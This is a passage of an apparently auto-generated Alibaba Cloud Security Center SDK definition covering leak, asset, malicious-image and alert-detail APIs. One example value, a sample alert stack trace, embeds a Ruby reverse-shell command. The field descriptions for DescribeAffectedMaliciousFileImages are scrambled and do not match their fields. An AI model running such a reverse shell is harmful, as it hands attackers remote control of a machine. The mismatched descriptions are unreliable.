  status?: string(name='Status', description='Specifies whether an AccessKey pair leak is handled. Valid values:

*   **pending**: unhandled
*   **dealed**: handled', example='pending'),
}

model DescribeAccesskeyLeakListResponseBody = {
  accessKeyLeakList?: [ 
    {
      accesskeyId?: string(name='AccesskeyId', description='The ID of the AccessKey pair that is leaked.', example='LTAI4Fytv7ALKzkNVBV6****'),
      aliUserName?: string(name='AliUserName', description='The name of the Alibaba Cloud account that is affected.', example='testAccountName'),
      asset?: string(name='Asset', description='The platform to which the asset belongs. The value is fixed as **Cloud platform**.', example='Cloud platform'),
      dealTime?: string(name='DealTime', description='The time when the AccessKey pair leak is handled.', example='2020-12-03 21:23:38'),
      dealType?: string(name='DealType', description='The method to handle the AccessKey pair leak. Valid values:

*   **pending**: The AccessKey pair leak is unhandled.
*   **manual**: The AccessKey pair leak is manually handled.
*   **disable**: The AccessKey pair leak is disabled.
*   **add-whitelist**: The AccessKey pair leak is added to the whitelist.', example='pending'),
      gmtModified?: long(name='GmtModified', description='The time when the AccessKey pair leak is first detected. The value of this parameter is a UNIX timestamp. Unit: milliseconds.', example='1612357897000'),
      id?: long(name='Id', description='The primary key ID of the database.', example='389357'),
      status?: string(name='Status', description='Indicates whether the AccessKey pair leak is handled. Valid values:

*   **pending**: unhandled
*   **dealed**: handled', example='pending'),
      type?: string(name='Type', description='The type of the leak. The value is fixed as **AccessKey**.', example='AccessKey'),
      url?: string(name='Url', description='The URL of the platform on which the AccessKey pair leak is detected.', example='https://github.com/hht312/test-ak/blob/0e466d2ecce55b4c924d773a058e5dc602d8****/1001'),
      userType?: string(name='UserType', description='The type of the account to which the leaked AccessKey pair belongs. Valid values:

*   **master**: Alibaba Cloud account
*   **ram**: RAM user', example='master'),
    }
  ](name='AccessKeyLeakList', description='An array that consists of the details about AccessKey pair leaks.'),
  akLeakCount?: int32(name='AkLeakCount', description='The number of AccessKey pair leaks that are unhandled.', example='1'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  gmtLast?: long(name='GmtLast', description='This parameter is deprecated.', example='1612357897000'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='B37C9052-A73E-4707-A024-9247702852BE'),
  totalCount?: int32(name='TotalCount', description='The total number of AccessKey pair leaks.', example='2'),
}

model DescribeAccesskeyLeakListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAccesskeyLeakListResponseBody(name='body'),
}

async function describeAccesskeyLeakListWithOptions(request: DescribeAccesskeyLeakListRequest, runtime: Util.RuntimeOptions): DescribeAccesskeyLeakListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.query)) {
    query['Query'] = request.query;
  }
  if (!Util.isUnset(request.startTs)) {
    query['StartTs'] = request.startTs;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAccesskeyLeakList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAccesskeyLeakList(request: DescribeAccesskeyLeakListRequest): DescribeAccesskeyLeakListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAccesskeyLeakListWithOptions(request, runtime);
}

model DescribeAffectedAssetsRequest {
  current?: string(name='Current', description='The number of the page to return.', example='1'),
  levels?: string(name='Levels', description='The severity. Separate multiple severities with commas (,). Valid values:

*   serious
*   suspicious
*   remind', example='serious,suspicious,remind'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> We recommend that you do not leave this parameter empty.', example='10'),
}

model DescribeAffectedAssetsResponseBody = {
  assetList?: [ 
    {
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='11'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='11'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.0.XX.XX'),
      riskNum?: int32(name='RiskNum', description='The number of viruses detected on the server.', example='1'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='947d7514-258a-4b47-9dde-9dxxxxxxxxxx'),
    }
  ](name='AssetList', description='An array that consists of the affected servers.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='100'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='7E0618A9-D5EF-4220-9471-C42XXXXXXXX'),
}

model DescribeAffectedAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAffectedAssetsResponseBody(name='body'),
}

async function describeAffectedAssetsWithOptions(request: DescribeAffectedAssetsRequest, runtime: Util.RuntimeOptions): DescribeAffectedAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.current)) {
    query['Current'] = request.current;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAffectedAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAffectedAssets(request: DescribeAffectedAssetsRequest): DescribeAffectedAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAffectedAssetsWithOptions(request, runtime);
}

model DescribeAffectedMaliciousFileImagesRequest {
  clusterId?: string(name='ClusterId', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='c60b77fe62093480db6164a3c2fa5****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='minikube'),
  containerId?: string(name='ContainerId', description='The total number of images that have malicious image samples.', example='cc20a1024011c44b6a8710d6f8b****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  image?: string(name='Image', description='An array consisting of the images that have malicious image samples.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  imageDigest?: string(name='ImageDigest', description='The severity of the malicious image sample. Separate multiple severities with commas (,). Valid values: serious suspicious remind', example='6a5e103187b31a94592a47a5858617f7a179ead61df7606****'),
  imageLayer?: string(name='ImageLayer', description='The text that is highlighted.', example='27213ad375b53628dd152a5ca****'),
  imageTag?: string(name='ImageTag', description='The timestamp of the last scan.', example='0.2'),
  lang?: string(name='Lang', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='zh'),
  levels?: string(name='Levels', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)
*   **ap-south-1**: India (Mumbai)', example='serious,suspicious'),
  maliciousMd5?: string(name='MaliciousMd5', description='The timestamp of the first scan.', example='d836968041f7683b5459****'),
  namespace?: string(name='Namespace', description='The namespace to which the image repository belongs.', example='test-002'),
  pageSize?: string(name='PageSize', description='The name of the image.', example='20'),
  pod?: string(name='Pod', description='The image layer.', example='22222-7xsqq'),
  repoId?: string(name='RepoId', description='The type of the asset that you want to scan. Valid values:

*   **container**
*   **image**', example='crr-vridcl4****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container.', example='cri-datvailb****'),
  repoName?: string(name='RepoName', description='The number of images that have malicious image samples returned on the current page.', example='centos'),
  repoNamespace?: string(name='RepoNamespace', description='The image digest.', example='hanghai-namespace'),
  repoRegionId?: string(name='RepoRegionId', description='The number of entries to return on each page. Default value: **20**.', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='The handling status of the malicious image sample. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist'),
}

model DescribeAffectedMaliciousFileImagesResponseBody = {
  affectedMaliciousFileImagesResponse?: [ 
    {
      clusterId?: string(name='ClusterId', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', example='docker-law'),
      containerId?: string(name='ContainerId', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      digest?: string(name='Digest', description='The name of the cluster.', example='6a5e1031a5858617f7d8a179ead6****'),
      downloadUrl?: string(name='DownloadUrl', example='https://aegis-metadata-file.oss-cn-shanghai.aliyuncs.com/'),
      filePath?: string(name='FilePath', description='The number of entries returned per page. Default value: **20**.', example='/d836968041f7683b5605a****'),
      firstScanTimestamp?: long(name='FirstScanTimestamp', description='The ID of the container.', example='1594907349000'),
      highLight?: string(name='HighLight', example='{"ruleVersion":"highlight_20210908","ruleId":600106,"events":[[2,54]]}'),
      image?: string(name='Image', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-conta****'),
      imageUuid?: string(name='ImageUuid', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='e05c0de798217637868ef4****'),
      instanceName?: string(name='InstanceName', example='sql-test-001'),
      internetIp?: string(name='InternetIp', example='47.101.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.22.XX.XX'),
      latestScanTimestamp?: long(name='LatestScanTimestamp', description='Queries the details of malicious image samples.', example='1596522785000'),
      latestVerifyTimestamp?: long(name='LatestVerifyTimestamp', description='The ID of the image repository.

>  You can call the [ListRepository](~~145293~~) operation to query the IDs of image repositories from the value of the **RepoId** response parameter.', example='1596522711000'),
      layer?: string(name='Layer', description='The pod.', example='27213ad3447f0209dd152a5cadea****'),
      level?: string(name='Level', example='serious'),
      maliciousMd5?: string(name='MaliciousMd5', description='The pod.', example='d836968041f768300d9605a****'),
      namespace?: string(name='Namespace', description='The namespace.', example='hanghai-namespace'),
      pod?: string(name='Pod', example='22222-7xsqq'),
      repoId?: string(name='RepoId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='crr-vridcl4****'),
      repoInstanceId?: string(name='RepoInstanceId', description='The timestamp of the last verification.', example='cri-datvail3m****'),
      repoName?: string(name='RepoName', description='DescribeAffectedMaliciousFileImages', example='centos'),
      repoRegionId?: string(name='RepoRegionId', description='The pagination information.', example='cn-shanghai'),
      status?: int32(name='Status', description='The name of the image repository.

>  Fuzzy match is supported.', example='1'),
      tag?: string(name='Tag', description='The UUID of the image.', example='0.2'),
      targetId?: string(name='TargetId', example='m-bp17m0pc0xprzbwo****'),
      targetName?: string(name='TargetName', example='source-test-obj-9LaLJ'),
      targetType?: string(name='TargetType', example='ECS_IMAGE'),
      uuid?: string(name='Uuid', example='48a473c4-1650-4931-a822-7e6c2c28****'),
    }
  ](name='AffectedMaliciousFileImagesResponse', description='The region ID of the image repository.'),
  pageInfo?: {
    count?: int32(name='Count', description='The URL to download the malicious image sample.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The image digest.', example='1'),
    pageSize?: int32(name='PageSize', description='The tag that is added to the image.', example='20'),
    totalCount?: int32(name='TotalCount', description='The types of the assets that you want to scan.', example='2'),
  }(name='PageInfo', description='The ID of the container image.'),
  requestId?: string(name='RequestId', description='The ID of the container image.

>  You can call the [ListRepository](~~145293~~) operation to query the IDs of container images from the value of the **InstanceId** response parameter.', example='ACF97412-FD09-4D1F-994F-34DF12BREF20'),
}

model DescribeAffectedMaliciousFileImagesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAffectedMaliciousFileImagesResponseBody(name='body'),
}

async function describeAffectedMaliciousFileImagesWithOptions(request: DescribeAffectedMaliciousFileImagesRequest, runtime: Util.RuntimeOptions): DescribeAffectedMaliciousFileImagesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.clusterName)) {
    query['ClusterName'] = request.clusterName;
  }
  if (!Util.isUnset(request.containerId)) {
    query['ContainerId'] = request.containerId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.image)) {
    query['Image'] = request.image;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.maliciousMd5)) {
    query['MaliciousMd5'] = request.maliciousMd5;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pod)) {
    query['Pod'] = request.pod;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAffectedMaliciousFileImages',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAffectedMaliciousFileImages(request: DescribeAffectedMaliciousFileImagesRequest): DescribeAffectedMaliciousFileImagesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAffectedMaliciousFileImagesWithOptions(request, runtime);
}

model DescribeAgentInstallStatusRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid value:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='59.46.XXX.XXX'),
  uuids?: string(name='Uuids', description='The UUIDs of the servers. Separate multiple UUIDs with commas (,).', example='inet-eae014a7-16c4-4d4e-9f03-5208f4dc****,inet-eae047da-1e5a-41ce-828d-47606e9b****'),
}

model DescribeAgentInstallStatusResponseBody = {
  aegisClientInvokeStatusResponseList?: [ 
    {
      message?: string(name='Message', description='The message returned.', example='Installed'),
      resuleCode?: string(name='ResuleCode', description='The result code returned. Valid values:

*   **-1**: The agent is not installed.
*   **0**: The agent is installed.
*   **1**: The directory of the agent failed to be created.
*   **2**: The installation package failed to be downloaded.
*   **3**: The installation file does not exist.
*   **4**: The verification information about the installation file does not exist.
*   **5**: The installation file failed to pass the verification.
*   **6**: The installation file failed to be executed.
*   **7**: The agent failed to be installed because the required permissions are not granted.
*   **8**: No process of the agent was detected.
*   **100**: The agent failed to be installed because an unknown error occurred.
*   **1001**: The agent failed to be installed because the automatic installation of the agent is not supported in the region.
*   **1002**: The agent failed to be installed because the agent cannot be installed on servers outside the cloud. You can install the agent only on supported servers.
*   **1003**: The agent failed to be installed because the operating system type of the server is not supported.
*   **1004**: An internal error occurred. Try again later.
*   **1005**: The Elastic Compute Service (ECS) instance is not running. Start the ECS instance and try again.
*   **1006**: The automatic installation of the agent is not supported on an ECS instance that resides in the classic network.
*   **1007**: The process of the installation command is manually stopped.
*   **1008**: The agent failed to be installed because Cloud Assistant is not installed.
*   **1009**: The execution of the installation command timed out. Try again later.
*   **1010**: The agent on the server is already online. You do not need to install the agent.', example='1'),
      result?: int32(name='Result', description='The installation result. Valid value:

*   **-1**: not installed
*   **0**: being installed
*   **1**: installed
*   **2**: installation failed', example='0'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='d123f6ae-9749-4338-8c7f-3c2c1ead****'),
    }
  ](name='AegisClientInvokeStatusResponseList', description='An array that consists of the installation results for the servers.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DescribeAgentInstallStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAgentInstallStatusResponseBody(name='body'),
}

async function describeAgentInstallStatusWithOptions(request: DescribeAgentInstallStatusRequest, runtime: Util.RuntimeOptions): DescribeAgentInstallStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAgentInstallStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAgentInstallStatus(request: DescribeAgentInstallStatusRequest): DescribeAgentInstallStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAgentInstallStatusWithOptions(request, runtime);
}

model DescribeAlarmEventDetailRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique ID of the alert event.

>  To query the details of an alert event, you must specify the unique ID of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the unique IDs of alert events.', example='9f62555666f177aa84ee1eaf465a****'),
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeAlarmEventDetailResponseBody = {
  data?: {
    alarmEventAliasName?: string(name='AlarmEventAliasName', description='The name of the alert event.', example='Login with unusual location'),
    alarmEventDesc?: string(name='AlarmEventDesc', description='The description of the alert event.', example='The detection model finds that self-mutation is running on your server. A self-mutation Trojan is a Trojan horse program with self-mutation function. It will change its hash or copy a large number of itself to different paths, and run in the background to avoid cleaning.'),
    alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The unique ID of the alert event.

>  To query the details about an alert event, you must specify the unique ID of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the unique IDs of alert events.', example='9f62555666f177aa84ee1eaf465a****'),
    appName?: string(name='AppName', description='The name of the container application.', example='app:msdp-uat-service'),
    canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online handling of the alert event is supported. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
    causeDetails?: [ 
      {
        key?: string(name='Key', description='The key that is used to trace the alert event.', example='842e314e69b1a2c45d5c1a2f88a16***'),
        value?: [ 
          {
            name?: string(name='Name', description='The name of the field that displays tracing information.', example='sshd'),
            type?: string(name='Type', description='The type of the field that displays tracing information. Valid values:

*   **text**
*   **html**', example='html'),
            value?: string(name='Value', description='The value of the field that displays tracing information.', example='<p>under a certain small probability, yundun may mistakenly judge the repeated attempts caused by the administrator forgetting or entering the wrong password as successful blasting. Please check according to the account number and time shown in the alarm details. Once it is confirmed that it is not the initiative of the administrator, it is recommended to immediately block the IP, and you can open it at the same time<a href="https://yundun.console.aliyun.com/?p=pam">PAM</a>, hosting host login password, improving remote connection efficiency and security control ability, and according to<a href="https://click.aliyun.com/m/1000226086/">best practice of ECS account security protection</a>Modify login password and convergence asset.</p>↵'),
          }
        ](name='Value', description='An array consisting of the value that is used to trace the alert event.'),
      }
    ](name='CauseDetails', description='An array consisting of the cause of the alert event, which can be used to trace the alert event.'),
    containHwMode?: boolean(name='ContainHwMode', description='Indicates whether the Safeguard Mode For Major Activities mode is enabled.', example='true'),
    containerId?: string(name='ContainerId', description='The ID of the container application.', example='container_1606995441910_394868_01_000***'),
    containerImageId?: string(name='ContainerImageId', description='The ID of the image to which the container belongs.', example='cadb7a725641'),
    containerImageName?: string(name='ContainerImageName', description='The name of the image to which the container belongs.', example='jenkins/jenkins:latest'),
    dataSource?: string(name='DataSource', description='The data source of the alert event.', example='aegis_***'),
    endTime?: long(name='EndTime', description='The timestamp when the alert event ends. Unit: milliseconds.', example='1542366542000'),
    instanceName?: string(name='InstanceName', description='The name of the instance.', example='i-wz92q7m5hsbgfhdss***'),
    internetIp?: string(name='InternetIp', description='The public IP address of the associated instance.', example='172.16.XX.XX'),
    intranetIp?: string(name='IntranetIp', description='The private IP address of the associated instance.', example='172.25.30.**'),
    k8sClusterId?: string(name='K8sClusterId', description='The ID of the Kubernetes cluster.', example='c562cf0d68e9749ee9fe544a7ab2f****'),
    k8sClusterName?: string(name='K8sClusterName', description='The name of the Kubernetes cluster.', example='TestK8sCluser'),
    k8sNamespace?: string(name='K8sNamespace', description='The namespace of the Kubernetes cluster.', example='sit-saic-trip'),
    k8sNodeId?: string(name='K8sNodeId', description='The ID of the Kubernetes cluster node.', example='i-bp14a1ay8e0aa9t0l***'),
    k8sNodeName?: string(name='K8sNodeName', description='The name of the Kubernetes cluster node.', example='cn-hangzhou.10.188.139.**'),
    k8sPodName?: string(name='K8sPodName', description='The name of the Kubernetes pod.', example='myapp-pod'),
    level?: string(name='Level', description='The severity of the alert event. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
    solution?: string(name='Solution', description='The solution to the alert event.', example='An invalid logon source IP has been detected. If you recognize this logon attempt, we recommend that you add the current logon source IP to the valid logon source IP list to avoid future alerts. If you do not recognize this logon attempt, we recommend that you modify the password.'),
    startTime?: long(name='StartTime', description='The timestamp when the alert event starts. Unit: milliseconds.', example='1542378601000'),
    type?: string(name='Type', description='The alert type of the alert event. Valid values:

*   Suspicious process
*   Webshell
*   Unusual logon
*   Exception
*   Sensitive file tampering
*   Malicious process (cloud threat detection)
*   Suspicious network connection
*   Other
*   Abnormal account
*   Application intrusion event
*   Cloud threat detection
*   Precise defense
*   Application whitelist
*   Persistent webshell
*   Web application threat detection
*   Malicious script
*   Threat intelligence
*   Malicious network activity
*   Cluster exception
*   Webshell (on-premises threat detection)
*   Vulnerability exploitation
*   Malicious process (on-premises threat detection)
*   Trusted exception', example='Webshell'),
    uuid?: string(name='Uuid', description='The instance UUID of the asset.', example='6690a46c-0edb-4663-a641-3629d1a9****'),
  }(name='Data', description='The details about the alert event.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7EA50837-2F0B-5BCC-AB61-4968D88D75AD'),
}

model DescribeAlarmEventDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventDetailResponseBody(name='body'),
}

async function describeAlarmEventDetailWithOptions(request: DescribeAlarmEventDetailRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.alarmUniqueInfo)) {
    query['AlarmUniqueInfo'] = request.alarmUniqueInfo;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAlarmEventDetail(request: DescribeAlarmEventDetailRequest): DescribeAlarmEventDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventDetailWithOptions(request, runtime);
}

model DescribeAlarmEventStackInfoRequest {
  eventName?: string(name='EventName', description='The name of the event.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the names of events.', example='Mining program'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  uniqueInfo?: string(name='UniqueInfo', description='The ID of the alert event.', example='1fbe8d16727f61d1478a674d6fa0****'),
  uuid?: string(name='Uuid', description='The UUID of the server to query.

>  You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the UUIDs of servers.', example='18b7336e-d469-473b-af83-8e5420f9****'),
}

model DescribeAlarmEventStackInfoResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='ECC6B3E3-D496-512D-B46D-E6996A6B63EE'),
  stackInfo?: string(name='StackInfo', description='The stack information of the alert details.', example='\\[ { "child": \\[ { "child": \\[ { "child": \\[ ], "data": { "cmdline": "id", "proc_path": "/bin/id", "pid": "\\[3033]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } }, { "child": \\[ ], "data": { "cmdline": "whoami", "proc_path": "/bin/whoami", "pid": "\\[3035]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "cmdline": "/bin/bash -c \\"id && whoami\\"", "proc_path": "/bin/bash", "pid": "\\[3022]" }, "description": { "extend": \\[ ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ], "data": { "src_ip": "0.0.0.0", "cmdline": "ruby -rsocket -e exit if fork;c=TCPSocket.new(\\\\"0.0.0.0\\\\",\\\\"1111\\\\");while(cmd=c.gets);IO.popen(cmd,\\\\"r\\\\"){|io|c.print io.read}end", "file": "ruby", "login_port": "22", "login_type": "Password", "proc_path": "/usr/bin/ruby", "dst_port": "1111", "pid": "3011", "user": "root", "dst_ip": "0.0.0.0", "log_time": "2020-01-20 09:00:00" }, "description": { "extend": \\[ { "content": "${tpl_netstat}", "content_type": "text" } ], "main": { "content": "${pid} ${cmdline}", "content_type": "markdown" } } } ]'),
}

model DescribeAlarmEventStackInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAlarmEventStackInfoResponseBody(name='body'),
}

async function describeAlarmEventStackInfoWithOptions(request: DescribeAlarmEventStackInfoRequest, runtime: Util.RuntimeOptions): DescribeAlarmEventStackInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.eventName)) {
    query['EventName'] = request.eventName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uniqueInfo)) {
    query['UniqueInfo'] = request.uniqueInfo;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAlarmEventStackInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAlarmEventStackInfo(request: DescribeAlarmEventStackInfoRequest): DescribeAlarmEventStackInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAlarmEventStackInfoWithOptions(request, runtime);
}

model DescribeAllEntityResponseBody = {
  entityList?: [ 
    {
      groupId?: int32(name='GroupId', example='281801'),
      instanceName?: string(name='InstanceName', example='abc'),
      internetIp?: string(name='InternetIp', example='172.19.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='100.104.XX.XX'),
      ip?: string(name='Ip', example='101.132.XX.XX'),
      os?: string(name='Os', example='windows'),
      uuid?: string(name='Uuid', description='DescribeAllEntity', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
    }
  ](name='EntityList', description='Queries the information about all assets. The information includes asset group IDs and asset names.'),
